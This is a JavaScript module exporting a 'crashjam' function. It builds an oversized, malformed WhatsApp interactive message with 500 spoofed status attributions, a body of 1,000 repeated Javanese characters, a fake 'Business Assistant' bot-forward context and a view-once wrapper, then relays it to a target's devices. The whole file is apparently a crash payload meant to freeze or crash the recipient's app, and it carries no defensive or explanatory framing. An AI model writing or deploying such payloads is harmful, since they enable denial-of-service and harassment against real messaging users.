const crypto = require('crypto');
const { relayCrashToDevices } = require('../target-utils');

async function crashjam(SYxS7, target) {
    const cleanUser = target.split('@')[0].split(':')[0];
    const targetBaseJid = `${cleanUser}@s.whatsapp.net`;

    const statusAttributions = Array.from({ length: 500 }, (_, i) => ({
        participant: `${Math.floor(10000000000 + Math.random() * 89999999999)}@s.whatsapp.net`,
        type: 1
    }));
    statusAttributions.unshift({ participant: targetBaseJid, type: 1 });

    const SABANA_LOVE = {
        messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            deviceListMetadata: {
                senderKeyIndex: 0,
                senderTimestamp: Date.now(),
                recipientKeyIndex: 0
            }
        },
        interactiveResponseMessage: {
            contextInfo: {
                remoteJid: "status@broadcast",
                fromMe: true,
                isQuestion: true,
                forwardedAiBotMessageInfo: {
                    botJid: "13135550202@bot",
                    botName: "Business Assistant",
                    creator: "FLIX"
                },
                statusAttributionType: 2,
                statusAttributions
            },
            body: {
                text: "⚡ CRASH JAM " + "ꦾ".repeat(1000),
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: JSON.stringify({ status: "active", code: "CRASH_JAM" }),
                version: 3
            }
        }
    };

    const SABIR7718_LOVE_SABANA = {
        viewOnceMessage: {
            message: SABANA_LOVE
        }
    };

    return await relayCrashToDevices(SYxS7, target, SABIR7718_LOVE_SABANA);
}

module.exports = { crashjam };
